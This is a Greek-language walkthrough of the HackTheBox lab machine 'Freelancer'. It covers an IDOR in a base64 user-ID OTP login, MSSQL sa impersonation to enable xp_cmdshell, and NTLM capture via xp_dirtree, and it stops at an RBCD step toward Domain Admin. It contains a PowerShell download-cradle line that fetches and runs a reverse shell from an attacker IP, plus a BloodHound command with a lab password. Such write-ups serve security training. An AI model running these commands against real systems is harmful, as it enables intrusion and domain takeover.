Το Freelancer ξεκινά με το να αποκτήσεις πρόσβαση σαν employer, μετά κάνεις escalate σε admin μέσω μιας ευπάθειας IDOR στο flow login OTP του QR-Code. Από εκεί, ένα SQL terminal εκθέτει εντολές MSSQL που επιτρέπουν impersonation του sa και ενεργοποίηση του xp_cmdshell για ένα reverse shell. Αφού κάνεις pivot μέσα από χρήστες μέσω αρχείων credentials και ένα memory dump, το μονοπάτι προς Domain Admin περνά μέσα από Resource-Based Constrained Delegation (RBCD).
Freelancer reg → Employer (IDOR) → Admin → sql_svc (MSSQL) → mikasaAckerman → lorra199 → SYSTEM (RBCD)

IDOR — Insecure Direct Object Reference

Τμήμα QR-Code

Το στοιχείο μενού QR-Code δημιουργεί ένα URL login OTP. Το σκανάρισμα αποκαλύπτει ότι το token κωδικοποιεί το αριθμητικό ID του τρέχοντος χρήστη σε base64:

Format URL OTP: http://freelancer.htb/accounts/login/otp/<base64_uid>/<token>
Το να αντικαταστήσεις την τιμή base64 με το κωδικοποιημένο ID οποιουδήποτε άλλου χρήστη κάνει login σαν εκείνον τον χρήστη — κλασικό IDOR.

Escalation σε admin

Περιήγηση στα σχόλια του blog για να βρεις το username του admin. Η καταμέτρηση URL προφίλ επιβεβαιώνει ότι ο admin έχει ID 2. Κωδικοποίησέ το: echo -n "2" | base64 → Mg==.

IDOR payload
# bob (ID 10011) http://freelancer.htb/accounts/login/otp/MTAwMTE=/e4ff26... # admin (ID 2) http://freelancer.htb/accounts/login/otp/Mgo=/e4ff26...

/admin — SQL Terminal

Το admin panel εκθέτει ένα SQL Terminal κάτω από τα Development Tools:

Τρέχων χρήστης

SELECT user_name(); -- Result: Freelancer_webapp_user

Πιάνοντας hash NTLM μέσω xp_dirtree

xp_dirtree '\\10.10.14.16\zip'
Το hash είναι άσπαστο. Κάνε αντ' αυτού pivot σε privilege escalation SQL.

Impersonation sa → sysadmin → xp_cmdshell

Έλεγξε αν το sa μπορεί να γίνει impersonated και αν κρατά δικαιώματα sysadmin, μετά δώσ' τα στον χρήστη μας:

-- Verify sa is sysadmin EXECUTE AS LOGIN = 'sa' SELECT IS_SRVROLEMEMBER('sysadmin') -- returns 1 -- Grant sysadmin to webapp user EXECUTE AS LOGIN = 'sa' EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin' -- Enable xp_cmdshell EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;

Reverse shell

Απευθείας shells μπλοκάρονται από το AV. Χρησιμοποίησε ένα PowerShell download-cradle:

EXEC xp_cmdshell 'powershell -c "IEX (iwr -usebasicparsing http://10.10.14.16/shell.ps1)"'

Καταμέτρηση Bloodhound

bloodhound-python
SP1R4@kali)-[~] └$ bloodhound-python -c ALL -u lorra199 -p 'PWN3D#l0rr@Armessa' -d freelancer.htb -ns 10.129.171.125

Ο lorra199 είναι μέλος του AD Recycle Bin:

Το AD Recycle Bin έχει GenericWrite πάνω στον Domain Controller DC$:

Το GenericWrite στο DC$ επιτρέπει κατάχρηση RBCD — μπορούμε να ορίσουμε το attribute msDS-AllowedToActOnBehalfOfOtherIdentity και να κάνουμε impersonate οποιονδήποτε χρήστη συμπεριλαμβανομένου του Administrator.

Privilege Escalation — RBCD → Domain Admin
